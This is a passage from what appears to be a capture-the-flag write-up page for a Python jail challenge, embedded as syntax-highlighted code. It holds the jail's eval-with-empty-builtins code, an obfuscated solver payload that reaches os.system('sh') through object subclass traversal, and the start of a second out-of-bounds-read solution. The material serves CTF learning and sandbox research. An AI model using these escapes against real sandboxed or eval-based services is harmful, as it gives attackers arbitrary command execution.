        <span class="token builtin">tuple</span><span class="token punctuation">(</span>clear<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment"># No names for youuuu</span>
        <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_varnames<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_filename<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_name<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_freevars<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_cellvars
    <span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>clear<span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> __name__<span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,xu,ra,Re,De,u_,Cu,ia,M2=`<code class="language-py">@ juliapoo
<span class="token keyword">lambda</span> g<span class="token punctuation">:</span> <span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token keyword">lambda</span> _0<span class="token punctuation">,</span> _1<span class="token punctuation">:</span>
        <span class="token punctuation">(</span><span class="token keyword">lambda</span> _2<span class="token punctuation">,</span> _4<span class="token punctuation">,</span> _8<span class="token punctuation">,</span> _16<span class="token punctuation">,</span> _32<span class="token punctuation">,</span> _64<span class="token punctuation">,</span> _128<span class="token punctuation">:</span>
        <span class="token punctuation">(</span><span class="token keyword">lambda</span> _1234567890<span class="token punctuation">:</span>
            <span class="token punctuation">(</span><span class="token keyword">lambda</span>
                s_n<span class="token punctuation">,</span>s_r<span class="token punctuation">,</span>s_a<span class="token punctuation">,</span>s_o<span class="token punctuation">,</span>s_t<span class="token punctuation">,</span>s_c<span class="token punctuation">,</span>s_l<span class="token punctuation">,</span>s_larr<span class="token punctuation">,</span>s_i<span class="token punctuation">,</span>s_g<span class="token punctuation">,</span>s_e<span class="token punctuation">,</span>s_b<span class="token punctuation">,</span>s_dash<span class="token punctuation">,</span>s_f<span class="token punctuation">,</span>s_ <span class="token punctuation">,</span>s_rarr<span class="token punctuation">,</span>s_u<span class="token punctuation">,</span>
                s_T<span class="token punctuation">,</span>
                s_F<span class="token punctuation">,</span>s_s<span class="token punctuation">,</span>
                s_lbrack<span class="token punctuation">,</span>s_rbrack<span class="token punctuation">,</span>
                s_4<span class="token punctuation">,</span>s_5<span class="token punctuation">,</span>s_9<span class="token punctuation">,</span>s_6<span class="token punctuation">,</span>s_3<span class="token punctuation">,</span>s_8<span class="token punctuation">,</span>s_2<span class="token punctuation">,</span>s_7<span class="token punctuation">,</span>s_0<span class="token punctuation">,</span>s_1<span class="token punctuation">,</span>
                s_x<span class="token punctuation">,</span>s_j<span class="token punctuation">,</span>s_N<span class="token punctuation">:</span>
                <span class="token punctuation">(</span><span class="token keyword">lambda</span> morestr<span class="token punctuation">:</span>
                    <span class="token punctuation">(</span><span class="token keyword">lambda</span> s_d<span class="token punctuation">,</span>s_m<span class="token punctuation">,</span>s_h<span class="token punctuation">:</span>
                        <span class="token punctuation">(</span><span class="token keyword">lambda</span> fromhex<span class="token punctuation">,</span> decodestr<span class="token punctuation">:</span>
                            <span class="token punctuation">(</span><span class="token keyword">lambda</span>
                                s__class__<span class="token punctuation">,</span>
                                s__bases__<span class="token punctuation">,</span>
                                s__subclasses__<span class="token punctuation">,</span>
                                s_load_module<span class="token punctuation">,</span>
                                s_system<span class="token punctuation">:</span>
                                <span class="token punctuation">(</span><span class="token keyword">lambda</span> load_module<span class="token punctuation">:</span>
                                    <span class="token punctuation">(</span><span class="token keyword">lambda</span> os<span class="token punctuation">:</span>
                                        <span class="token punctuation">(</span><span class="token keyword">lambda</span> system<span class="token punctuation">:</span> system<span class="token punctuation">(</span>s_s <span class="token operator">+</span> s_h<span class="token punctuation">)</span><span class="token punctuation">)</span>
                                        <span class="token punctuation">(</span>g<span class="token punctuation">(</span>os<span class="token punctuation">,</span> s_system<span class="token punctuation">)</span><span class="token punctuation">)</span>
                                    <span class="token punctuation">)</span><span class="token punctuation">(</span>load_module<span class="token punctuation">(</span>s_o <span class="token operator">+</span> s_s<span class="token punctuation">)</span><span class="token punctuation">)</span>
                                <span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">,</span> s__class__<span class="token punctuation">)</span><span class="token punctuation">,</span> s__bases__<span class="token punctuation">)</span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span> s__subclasses__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>_16<span class="token operator">+</span>_64<span class="token punctuation">]</span><span class="token punctuation">,</span> s_load_module<span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token punctuation">)</span><span class="token punctuation">(</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_2<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_5<span class="token operator">+</span>s_6<span class="token operator">+</span>s_2<span class="token operator">+</span>s_6<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_6<span class="token operator">+</span>s_4<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_d<span class="token operator">+</span>s_6<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_4<span class="token operator">+</span>s_7<span class="token operator">+</span>s_5<span class="token operator">+</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_9<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_4<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token operator">+</span>s_6<span class="token operator">+</span>s_d<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            <span class="token punctuation">)</span>
                        <span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">,</span> s_e<span class="token operator">+</span>s_n<span class="token operator">+</span>s_c<span class="token operator">+</span>s_o<span class="token operator">+</span>s_d<span class="token operator">+</span>s_e<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s_f<span class="token operator">+</span>s_r<span class="token operator">+</span>s_o<span class="token operator">+</span>s_m<span class="token operator">+</span>s_h<span class="token operator">+</span>s_e<span class="token operator">+</span>s_x<span class="token punctuation">)</span><span class="token punctuation">,</span> s_d<span class="token operator">+</span>s_e<span class="token operator">+</span>s_c<span class="token operator">+</span>s_o<span class="token operator">+</span>s_d<span class="token operator">+</span>s_e<span class="token punctuation">)</span>
                    <span class="token punctuation">)</span><span class="token punctuation">(</span>morestr<span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span>morestr<span class="token punctuation">[</span>_2<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span>morestr<span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"&#123;g(&#123;&#125;, s_g+s_e+s_t)&#125;"</span></span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">(</span>
                <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_4<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token operator">==</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token operator">!=</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token operator">!=</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">:</span>_0<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">:</span>_0<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">yield</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">yield</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">yield</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_16<span class="token punctuation">]</span>
            <span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">(</span>_2<span class="token operator">+</span>_16<span class="token operator">+</span>_64<span class="token operator">+</span>_128<span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_2<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_4<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_8<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token operator">!=</span>g<span class="token punctuation">,</span> g<span class="token operator">==</span>g<span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token comment"># @ maple3142 - OOB read, ref (https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc)</span>
<span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType
<span class="token keyword">import</span> unicodedata

<span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> CodeType<span class="token punctuation">(</span>
        code<span class="token punctuation">.</span>co_argcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_flags<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_code<span class="token punctuation">,</span>
        <span class="token comment"># No consts for youuu</span>
        <span class="token builtin">tuple</span><span class="token punctuation">(</span>clear<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment"># No names for youuuu</span>
        <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_varnames<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_filename<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_name<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_freevars<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_cellvars
    <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getnum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'(not[[]])'</span>
    <span class="token keyword">return</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'(not[])+'</span> <span class="token operator">*</span> num<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span>

names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
chr_code <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        chr_code <span class="token operator">+=</span> <span class="token number">1</span>
        char <span class="token operator">=</span> unicodedata<span class="token punctuation">.</span>normalize<span class="token punctuation">(</span><span class="token string">'NFKC'</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>chr_code<span class="token punctuation">)</span><span class="token punctuation">)</span>
